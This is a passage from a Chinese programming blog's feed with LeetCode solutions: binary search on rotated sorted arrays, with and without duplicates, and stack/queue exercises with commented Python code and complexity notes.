后，得到输入数组。例如，原数组 nums = [0,1,2,4,5,6,7] 在变化后可能得到：<br>若旋转 4 次，则可以得到 [4,5,6,7,0,1,2]<br>若旋转 7 次，则可以得到 [0,1,2,4,5,6,7]<br>注意，数组 [a[0], a[1], a[2], …, a[n-1]] 旋转一次 的结果为数组 [a[n-1], a[0], a[1], a[2], …, a[n-2]] 。</p><p>给你一个元素值 互不相同 的数组 nums ，它原来是一个升序排列的数组，并按上述情形进行了多次旋转。请你找出并返回数组中的 最小元素 。</p><p> 示例 1：</p><p>输入：nums = [3,4,5,1,2]<br>输出：1<br>解释：原数组为 [1,2,3,4,5] ，旋转 3 次得到输入数组。<br>示例 2：</p><p>输入：nums = [11,13,15,17]<br>输出：11<br>解释：原数组为 [11,13,15,17] ，旋转 4 次得到输入数组。</p><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>寻找最小值，只需要比较mid和right的值即可，<a href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array/solution/er-fen-cha-zhao-wei-shi-yao-zuo-you-bu-dui-cheng-z/">原因见为什么比较右边界</a>。</p><p>（1）当中间值比右边值小的时候（nums[mid]&lt;nums[right]），则往左边找，因为此时nums[mid]有可能是最小值，因此right=mid而不是right=mid-1,因为mid-1会错过最小值nums[mid]</p><p>（2）当中间值比右边大的时候（nums[mid]&gt;nums[right]），则往右找，此时nums[mid]肯定不是最小值，所以left=left+1;</p><p>（3）因为是无重复数组，所以不存在nums[mid]==nums[right]</p><h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">findMin</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    :type nums: List[int]    :rtype: int    """</span>    left<span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">while</span> left<span class="token operator">&lt;</span>right<span class="token punctuation">:</span>        mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>        <span class="token keyword">if</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">&lt;</span>nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#[left,mid]有序</span>            <span class="token comment" spellcheck="true"># 如果中间值小于最大值，则最大值减小</span>            <span class="token comment" spellcheck="true"># 疑问：为什么</span>            <span class="token comment" spellcheck="true"># high = mid;</span>            <span class="token comment" spellcheck="true"># 而不是</span>            <span class="token comment" spellcheck="true"># high = mid - 1;</span>            <span class="token comment" spellcheck="true"># 解答：&amp;#123;4, 5, 1, 2, 3&amp;#125;，如果high = mid - 1，则丢失了最小值1</span>            right<span class="token operator">=</span>mid<span class="token comment" spellcheck="true">#如果mid是最小值 则right=mid-1会错过最小值</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 如果中间值大于最大值，则最小值变大</span>            <span class="token comment" spellcheck="true">#疑问：为什么</span>            <span class="token comment" spellcheck="true"># low = mid + 1;</span>            <span class="token comment" spellcheck="true"># 而不是</span>            <span class="token comment" spellcheck="true"># low = mid;</span>            <span class="token comment" spellcheck="true"># 解答：&amp;#123;4, 5, 6, 1, 2, 3&amp;#125;，nums[mid] = 6，low = mid + 1, 刚好nums[low] = 1</span>            <span class="token comment" spellcheck="true">#继续疑问：上边的解释太牵强了，难道没有可能low = mid + 1, 正好错过了最小值</span>            <span class="token comment" spellcheck="true">#继续解答：不会错过!!! 因为nums[mid]>=nums[right],所以nums[mid]一定不是最小值</span>            left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>    <span class="token keyword">return</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复杂度分析-1"><a href="#复杂度分析-1" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p>log(n)</p><h1 id="变形4-不完全有序-含重复值"><a href="#变形4-不完全有序-含重复值" class="headerlink" title="变形4  不完全有序 含重复值"></a>变形4  不完全有序 含重复值</h1><h3 id="4-1-LTD81搜索旋转排序数组-II-含重复值"><a href="#4-1-LTD81搜索旋转排序数组-II-含重复值" class="headerlink" title="4.1 LTD81搜索旋转排序数组 II 含重复值"></a>4.1 <a href="https://leetcode-cn.com/problems/search-in-rotated-sorted-array-ii/">LTD81搜索旋转排序数组 II 含重复值</a></h3><h4 id="题目描述：-6"><a href="#题目描述：-6" class="headerlink" title="题目描述："></a>题目描述：</h4><p>已知存在一个按非降序排列的整数数组 nums ，数组中的值不必互不相同。</p><p>在传递给函数之前，nums 在预先未知的某个下标 k（0 &lt;= k &lt; nums.length）上进行了 旋转 ，使数组变为 [nums[k], nums[k+1], …, nums[n-1], nums[0], nums[1], …, nums[k-1]]（下标 从 0 开始 计数）。例如， [0,1,2,4,4,4,5,6,6,7] 在下标 5 处经旋转后可能变为 [4,5,6,6,7,0,1,2,4,4] 。</p><p>给你 旋转后 的数组 nums 和一个整数 target ，请你编写一个函数来判断给定的目标值是否存在于数组中。如果 nums 中存在这个目标值 target ，则返回 true ，否则返回 false 。</p><p> 示例 1：</p><pre><code>输入：nums = [2,5,6,0,0,1,2], target = 0输出：true</code></pre><p>示例 2：</p><pre><code>输入：nums = [2,5,6,0,0,1,2], target = 3输出：false</code></pre><h4 id="解题思路：-3"><a href="#解题思路：-3" class="headerlink" title="解题思路："></a>解题思路：</h4><p>这个题目是3.1的变形，对于数组中有重复元素的情况，二分查找时可能会有a[left]=a[mid]=a[right]，此时无法判断哪个区间是有序的。</p><p>例如nums=[3,1,2,3,3,3,3]，target=2，首次二分时无法判断区间 [0,3][0,3] 和区间 [4,6][4,6] 哪个是有序的。</p><p>对于这种情况，我们只能将当前二分区间的左边界加一，右边界减一，然后在新区间上继续二分查找。</p><h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type nums: List[int]        :type target: int        :rtype: int        """</span>        left<span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>            mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>            <span class="token comment" spellcheck="true">#step1 判断mid的位置</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">True</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">and</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#去掉重复值</span>                left<span class="token operator">=</span>left<span class="token operator">+</span><span class="token number">1</span>                right<span class="token operator">=</span>right<span class="token number">-1</span>            <span class="token keyword">elif</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">>=</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#[left,mid]有序  ##注意这里要用elif：因为去掉重复值后开启新的判断，即新的left,right</span>                <span class="token comment" spellcheck="true">#step2 判断target的位置</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">&lt;</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">and</span> target<span class="token operator">>=</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#target在左边</span>                    right<span class="token operator">=</span>mid<span class="token number">-1</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#[left,mid]无序，[mid,right]有序</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">></span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">and</span> target<span class="token operator">&lt;</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#target在右边</span>                    left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    right<span class="token operator">=</span>mid<span class="token number">-1</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token comment" spellcheck="true">#没有查到</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复杂的分析"><a href="#复杂的分析" class="headerlink" title="复杂的分析"></a>复杂的分析</h4><h3 id="4-2-LTD154-寻找旋转排序数组中的最小值-II-含重复值"><a href="#4-2-LTD154-寻找旋转排序数组中的最小值-II-含重复值" class="headerlink" title="4.2 LTD154. 寻找旋转排序数组中的最小值 II 含重复值"></a>4.2 <a href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array-ii/">LTD154. 寻找旋转排序数组中的最小值 II</a> 含重复值</h3><h4 id="题目描述：-7"><a href="#题目描述：-7" class="headerlink" title="题目描述："></a>题目描述：</h4><p>已知一个长度为 n 的数组，预先按照升序排列，经由 1 到 n 次 旋转 后，得到输入数组。例如，原数组 nums = [0,1,4,4,5,6,7] 在变化后可能得到：<br>若旋转 4 次，则可以得到 [4,5,6,7,0,1,4]<br>若旋转 7 次，则可以得到 [0,1,4,4,5,6,7]<br>注意，数组 [a[0], a[1], a[2], …, a[n-1]] 旋转一次 的结果为数组 [a[n-1], a[0], a[1], a[2], …, a[n-2]] 。</p><p>给你一个可能存在 重复 元素值的数组 nums ，它原来是一个升序排列的数组，并按上述情形进行了多次旋转。请你找出并返回数组中的 最小元素 。</p><p>示例 1：</p><p>输入：nums = [1,3,5]<br>输出：1</p><p>示例 2：</p><p>输入：nums = [2,2,2,0,1]<br>输出：0</p><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><p>在3.2的基础上 判断考虑（3）nums[mid]==nums[right]的情况：</p><p>（3）当nums[mid]==nums[right]时候，我们无法判断最小值在左边还是右边，此时舍弃num[right]即可。</p><h4 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">findMin</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type nums: List[int]        :rtype: int        """</span>        left<span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>        <span class="token keyword">while</span> left<span class="token operator">&lt;</span>right<span class="token punctuation">:</span>            mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>            <span class="token keyword">if</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">&lt;</span>nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#[left,mid]有序</span>                <span class="token comment" spellcheck="true"># 如果中间值小于最大值，则最大值减小</span>                <span class="token comment" spellcheck="true"># 疑问：为什么</span>                <span class="token comment" spellcheck="true"># high = mid;</span>                <span class="token comment" spellcheck="true"># 而不是</span>                <span class="token comment" spellcheck="true"># high = mid - 1;</span>                <span class="token comment" spellcheck="true"># 解答：&amp;#123;4, 5, 1, 2, 3&amp;#125;，如果high = mid - 1，则丢失了最小值1</span>                right<span class="token operator">=</span>mid<span class="token comment" spellcheck="true">#如果mid是最小值 则right=mid-1会错过最小值</span>            <span class="token keyword">elif</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">></span>nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token comment" spellcheck="true"># 如果中间值大于最大值，则最小值变大</span>                <span class="token comment" spellcheck="true">#疑问：为什么</span>                <span class="token comment" spellcheck="true"># low = mid + 1;</span>                <span class="token comment" spellcheck="true"># 而不是</span>                <span class="token comment" spellcheck="true"># low = mid;</span>                <span class="token comment" spellcheck="true"># 解答：&amp;#123;4, 5, 6, 1, 2, 3&amp;#125;，nums[mid] = 6，low = mid + 1, 刚好nums[low] = 1</span>                <span class="token comment" spellcheck="true">#继续疑问：上边的解释太牵强了，难道没有可能low = mid + 1, 正好错过了最小值</span>                <span class="token comment" spellcheck="true">#继续解答：不会错过!!! 因为nums[mid]>=nums[right],所以nums[mid]一定不是最小值</span>                left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#nums[mid]==nums[right]</span>                right<span class="token operator">=</span>right<span class="token number">-1</span>        <span class="token keyword">return</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol><li><a href="https://leetcode-cn.com/circle/discuss/Z80AkT/">二分法题目集合</a>  不错    </li><li><a href="https://leetcode-cn.com/problems/search-in-rotated-sorted-array-ii/solution/yi-wen-dai-ni-gao-ding-er-fen-sou-suo-ji-ki52/">一文带你搞定二分搜索及多个变种</a></li><li><a href="https://www.bilibili.com/video/BV1d54y1q7k7">相关b站视频</a></li></ol>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/leetcode/">leetcode</category>
      
      
      <comments>https://m01ly.github.io/2020/05/26/leetcode-binary/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>栈和队列相关题目</title>
      <link>https://m01ly.github.io/2020/05/16/leetcode-stackandqueue/</link>
      <guid>https://m01ly.github.io/2020/05/16/leetcode-stackandqueue/</guid>
      <pubDate>Sat, 16 May 2020 02:24:11 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>栈先进后出，队列先进先出。</p><table><thead><tr><th align="left">题号</th><th align="left">题目</th><th>难度</th></tr></thead><tbody><tr><td align="left">leetcode 20</td><td align="left"><a href="https://leetcode-cn.com/problems/valid-parentheses/">有效的括号</a></td><td>简单</td></tr><tr><td align="left">剑指 Offer 09</td><td align="left"><a href="https://leetcode-cn.com/problems/yong-liang-ge-zhan-shi-xian-dui-lie-lcof/">用两个栈实现队列</a></td><td>简单</td></tr><tr><td align="left">leetcode 225</td><td align="left"><a href>用队列实现栈</a></td><td>简单</td></tr><tr><td align="left">leetcode 1047</td><td align="left"><a href="https://leetcode-cn.com/problems/remove-all-adjacent-duplicates-in-string/">删除字符串中的所有相邻重复项</a></td><td>简单</td></tr><tr><td align="left">leetcode  1021</td><td align="left"><a href="https://leetcode-cn.com/problems/remove-outermost-parentheses/">删除最外层的括号</a></td><td>简单</td></tr></tbody></table><h2 id="1-剑指-Offer-09-用两个栈实现队列"><a href="#1-剑指-Offer-09-用两个栈实现队列" class="headerlink" title="1 剑指 Offer 09. 用两个栈实现队列"></a>1 <a href="https://leetcode-cn.com/problems/yong-liang-ge-zhan-shi-xian-dui-lie-lcof/">剑指 Offer 09. 用两个栈实现队列</a></h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>用两个栈实现一个队列。队列的声明如下，请实现它的两个函数 appendTail 和 deleteHead ，分别完成在队列尾部插入整数和在队列头部删除整数的功能。(若队列中没有元素，deleteHead 操作返回 -1 )</p><p>示例 1：</p><p>输入：<br>[“CQueue”,”appendTail”,”deleteHead”,”deleteHead”]<br>[[],[3],[],[]]<br>输出：[null,null,3,-1]</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目只要求实现 加入队尾appendTail() 和 删除队首deleteHead() 两个函数的正常工作，因此我们可以设计栈 A 用于加入队尾操作，栈 B 用于将元素倒序，从而实现删除队首元素。</p><p>加入队尾 appendTail()函数： 将数字 val 加入栈 A 即可。<br>删除队首deleteHead()函数： 有以下三种情况。<br>    当栈 B 不为空： B中仍有已完成倒序的元素，因此直接返回 B 的栈顶元素。<br>    否则，当 A 为空： 即两个栈都为空，无元素，因此返回 -1−1 。<br>    否则： 将栈 A 元素全部转移至栈 B 中，实现元素倒序，并返回栈 B 的栈顶元素。</p><p><img src="/2020/05/16/leetcode-stackandqueue/twostackTobequeue.gif" alt="twostackTobequeue"></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">class</span> <span class="token class-name">CQueue</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>A<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>B<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">appendTail</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type value: int        :rtype: None        """</span>        self<span class="token punctuation">.</span>A<span class="token punctuation">.</span>append<span class="token punctuation">(</span>value<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">deleteHead</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :rtype: int        """</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>B<span class="token punctuation">:</span> <span class="token keyword">return</span> self<span class="token punctuation">.</span>B<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#如果B栈有元素  则弹出栈顶元素即可</span>        <span class="token keyword">if</span> <span class="token operator">not</span> self<span class="token punctuation">.</span>A<span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token comment" spellcheck="true">#B为空 并且A 为空  则返回-1</span>        <span class="token comment" spellcheck="true">#当A不为空的时候</span>        <span class="token keyword">while</span> self<span class="token punctuation">.</span>A<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>B<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>A<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#将A栈弹出  入B栈</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>B<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p><strong>时间复杂度：</strong> appendTail()函数为 O(1) ；deleteHead() 函数在 N 次队首元素删除操作中总共需完成 N个元素的倒序。<br><strong>空间复杂度：</strong>  O(N)最差情况下，栈 A 和 B 共保存 N个元素。</p><h2 id="2-leetcode225-用队列实现栈"><a href="#2-leetcode225-用队列实现栈" class="headerlink" title="2 leetcode225. 用队列实现栈"></a>2 <a href="https://leetcode-cn.com/problems/implement-stack-using-queues/">leetcode225. 用队列实现栈</a></h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>请你仅使用两个队列实现一个后入先出（LIFO）的栈，并支持普通栈的全部四种操作（push、top、pop 和 empty）。</p><p>实现 MyStack 类：</p><p>void push(int x) 将元素 x 压入栈顶。<br>int pop() 移除并返回栈顶元素。<br>int top() 返回栈顶元素。<br>boolean empty() 如果栈是空的，返回 true ；否则，返回 false 。</p><p>注意：</p><p>你只能使用队列的基本操作 —— 也就是 push to back、peek/pop from front、size 和 is empty 这些操作。<br>你所使用的语言也许不支持队列。 你可以使用 list （列表）或者 deque（双端队列）来模拟一个队列 , 只要是标准的队列操作即可。</p><p>示例：</p><p>输入：<br>[“MyStack”, “push”, “push”, “top”, “pop”, “empty”]<br>[[], [1], [2], [], [], []]<br>输出：<br>[null, null, null, 2, 2, false]</p><p>解释：<br>MyStack myStack = new MyStack();<br>myStack.push(1);<br>myStack.push(2);<br>myStack.top(); // 返回 2<br>myStack.pop(); // 返回 2<br>myStack.empty(); // 返回 False</p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MyStack</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Initialize your data structure here.        """</span>        self<span class="token punctuation">.</span>A<span class="token operator">=</span>deque<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>B<span class="token operator">=</span>deque<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">push</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Push element x onto stack.        :type x: int        :rtype: None        """</span>        self<span class="token punctuation">.</span>A<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">pop</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Removes the element on top of the stack and returns that element.        :rtype: int        """</span>        size<span class="token operator">=</span>len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>A<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token comment" spellcheck="true">#留一个元素</span>        <span class="token keyword">while</span> size<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>B<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>A<span class="token punctuation">.</span>popleft<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#将A的元素除了最左边的都弹入B中</span>            size<span class="token operator">=</span>size<span class="token number">-1</span>        res<span class="token operator">=</span>self<span class="token punctuation">.</span>A<span class="token punctuation">.</span>popleft<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#返回</span>        self<span class="token punctuation">.</span>A<span class="token punctuation">,</span>self<span class="token punctuation">.</span>B<span class="token operator">=</span>self<span class="token punctuation">.</span>B<span class="token punctuation">,</span>self<span class="token punctuation">.</span>A<span class="token comment" spellcheck="true">##将que2和que1交换 que1经过之前的操作应该是空了</span>        <span class="token comment" spellcheck="true">#一定注意不能直接使用que1 = que2 这样que2的改变会影响que1 可以用浅拷贝</span>        <span class="token keyword">return</span> res    <span class="token keyword">def</span> <span class="token function">top</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Get the top element.        :rtype: int        """</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>A<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">empty</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Returns whether the stack is empty.        :rtype: bool        """</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>A<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析-1"><a href="#复杂度分析-1" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p><strong>时间复杂度：</strong>入栈操作O(n)，其余操作都是 O(1)。<br>入栈操作需要将A 中的 n个元素出队，并入队 n+1个元素到B ，共有 2n+1 次操作，每次出队和入队操作的时间复杂度都是 O(1)，因此入栈操作的时间复杂度是O(n)。<br>出栈操作对应将A的前端元素出队，时间复杂度是 O(1)。<br>获得栈顶元素操作对应获得 A的前端元素，时间复杂度是 O(1)。<br>判断栈是否为空操作只需要判断A是否为空，时间复杂度是 O(1)。</p><p><strong>空间复杂度：</strong>O(n)，其中 n 是栈内的元素。需要使用两个队列存储栈内的元素。</p><h2 id="3-leetcode-20-有效的括号"><a href="#3-leetcode-20-有效的括号" class="headerlink" title="3 leetcode 20. 有效的括号"></a>3 <a href="https://leetcode-cn.com/problems/valid-parentheses/">leetcode 20. 有效的括号</a></h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定一个只包括 ‘(‘，’)’，’{‘，’}’，’[‘，’]’ 的字符串 s ，判断字符串是否有效。</p><p>有效000字符串需满足：</p><p>左括号必须用相同类型的右括号闭合。<br>左括号必须以正确的顺序闭合。</p><p>示例 1：</p><p>输入：s = “()”<br>输出：true<br>示例 2：</p><p>输入：s = “()[]{}”<br>输出：true</p><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.1 待入栈元素在字典中无匹配元素即都是左括号 则 入栈</p><p>1.2 若待入栈元素在字典中有匹配元素</p><p>​    1.2.1 stack不为空（防止s=”]”的情况） 并且 在栈顶匹配元素成功 </p><p>​              则 将栈顶元素pop出</p><p>​     1.2.2 否则 直接返回False</p><p><img src="/2020/05/16/leetcode-stackandqueue/isvalid.gif" alt="isvalid"></p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">isValid</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type s: str        :rtype: bool        """</span>        dic<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;')':'(','&amp;#125;':"&amp;#123;","]":"["&amp;#125;</span>        